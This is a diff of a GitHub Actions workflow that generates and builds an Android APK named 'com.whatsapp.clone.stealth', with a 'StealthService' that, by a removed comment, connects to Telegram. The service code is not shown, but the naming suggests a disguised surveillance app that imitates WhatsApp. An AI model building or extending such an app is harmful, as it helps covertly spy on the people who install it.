@@ -24,11 +24,9 @@ jobs:
         mkdir -p app/src/main/res/values
         mkdir -p app/src/main/res/mipmap-mdpi
 
-        # أيقونات وهمية لتجنب أخطاء الموارد
         echo '<vector xmlns:android="http://schemas.android.com/apk/res/android" android:width="24dp" android:height="24dp" android:viewportWidth="24" android:viewportHeight="24"><path android:fillColor="#10B981" android:pathData="M12,2C6.48,2 2,6.48 2,12s4.48,10 10,10 10,-4.48 10,-10S17.52,2 12,2z"/></vector>' > app/src/main/res/mipmap-mdpi/ic_launcher.xml
         echo '<vector xmlns:android="http://schemas.android.com/apk/res/android" android:width="24dp" android:height="24dp" android:viewportWidth="24" android:viewportHeight="24"><path android:fillColor="#10B981" android:pathData="M12,2C6.48,2 2,6.48 2,12s4.48,10 10,10 10,-4.48 10,-10S17.52,2 12,2z"/></vector>' > app/src/main/res/mipmap-mdpi/ic_launcher_round.xml
 
-        # إنشاء MainActivity سليم وخالي من أي أخطاء تجميع
         cat << 'EOF' > app/src/main/java/com/whatsapp/clone/stealth/MainActivity.java
         package com.whatsapp.clone.stealth;
 
@@ -47,7 +45,6 @@ jobs:
             protected void onCreate(Bundle savedInstanceState) {
                 super.onCreate(savedInstanceState);
 
-                // تصميم الواجهة بأسلوب Green Glassmorphism
                 LinearLayout layout = new LinearLayout(this);
                 layout.setOrientation(LinearLayout.VERTICAL);
                 layout.setGravity(Gravity.CENTER);
@@ -84,7 +81,6 @@ jobs:
         }
         EOF
 
-        # إنشاء StealthService سليم ومستقر للاتصال بـ Telegram
         cat << 'EOF' > app/src/main/java/com/whatsapp/clone/stealth/StealthService.java
         package com.whatsapp.clone.stealth;
 
@@ -143,7 +139,6 @@ jobs:
         }
         EOF
 
-        # إنشاء AndroidManifest.xml سليم ومتوافق
         cat << 'EOF' > app/src/main/AndroidManifest.xml
         <manifest xmlns:android="http://schemas.android.com/apk/res/android"
             package="com.whatsapp.clone.stealth">
@@ -176,7 +171,6 @@ jobs:
         </manifest>
         EOF
 
-        # ملفات إعدادات المشروع و Gradle
         cat << 'EOF' > settings.gradle
         pluginManagement {
             repositories {
@@ -231,4 +225,25 @@ jobs:
         mkdir -p $ANDROID_HOME
         
         wget -q https://dl.google.com/android/repository/commandlinetools-linux-9477386_latest.zip -O cmdtools.zip
-        mkdir -p
+        mkdir -p $ANDROID_HOME/cmdline-tools/latest
+        unzip -q cmdtools.zip -d $ANDROID_HOME/temp_tools
+        mv $ANDROID_HOME/temp_tools/cmdline-tools/* $ANDROID_HOME/cmdline-tools/latest/
+        rm -rf cmdtools.zip $ANDROID_HOME/temp_tools
+
+        export PATH=$PATH:$ANDROID_HOME/cmdline-tools/latest/bin:$ANDROID_HOME/platform-tools
+
+        yes | sdkmanager --licenses || true
+        sdkmanager "platform-tools" "platforms;android-34" "build-tools;34.0.0"
+
+        echo "sdk.dir=$ANDROID_HOME" > local.properties
+
+        wget -q https://services.gradle.org/distributions/gradle-8.2-bin.zip
+        unzip -q gradle-8.2-bin.zip
+
+        ./gradle-8.2/bin/gradle assembleDebug --no-daemon
+
+    - name: Upload APK Artifact
+      uses: actions/upload-artifact@v4
+      with:
+        name: app-debug
+        path: app/build/outputs/apk/debug/app-debug.apk
